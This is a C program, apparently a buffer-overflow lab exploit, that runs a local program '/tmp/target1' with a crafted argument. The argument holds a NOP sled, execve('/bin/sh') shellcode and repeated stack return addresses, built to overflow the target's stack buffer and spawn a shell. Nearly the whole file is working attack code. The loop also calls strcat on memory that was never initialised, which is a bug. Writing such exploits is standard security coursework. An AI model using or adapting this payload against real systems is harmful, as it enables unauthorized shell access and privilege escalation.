#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  int fullrange = 200;
  int range = 180;

  while(range<fullrange){
  char *args[3];
  char *env[1];

  char* alignment;
  alignment = (malloc(range));
  if(alignment==NULL){
    fprintf(stderr, "malloc failed.\n");
    return -1;
  }

  int i=0;
  while(i<range){
    strcat(alignment, "\x90");
    //strcpy(alignment, "\x90");
    i++;
  }
  strcat(alignment, "\0");
  //fprintf(stderr, "alignment string = %s\n", alignment);

  //static char alignment[] = "\x90";
  static char sprepeat[] = "\x54\xf5\xff\xbf";
  //fprintf(stderr, "strlen(shellcode)=%ibytes\n", (int) strlen(shellcode));

  args[0] = TARGET; 
  //args[1] = strcat(shellcode, sprepeat);
  //args[1] = strcat(alignment, shellcode);  
  //args[1] = strcat(strcat(alignment, shellcode), sprepeat);
  //args[1] = strcat(args[1], sprepeat);


  args[1] =
          "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
          "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
          "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
          "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
          "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
          "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
          "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
          "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
          "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
          "\x80\xe8\xdc\xff\xff\xff/bin/sh"
          "\x84\xfc\xff\xbf\x84\xfc\xff\xbf"
          "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf"
          "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf"
          "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf"
          "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf"
          "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf"
          "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf"
          "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf"
          "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf"
          "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf"
          "\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf\x84\xfc\xff\xbf";

  //fprintf(stderr, "args[1]=\"%s\"\n", args[1]);
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  range++;
  }
  return 0;
}
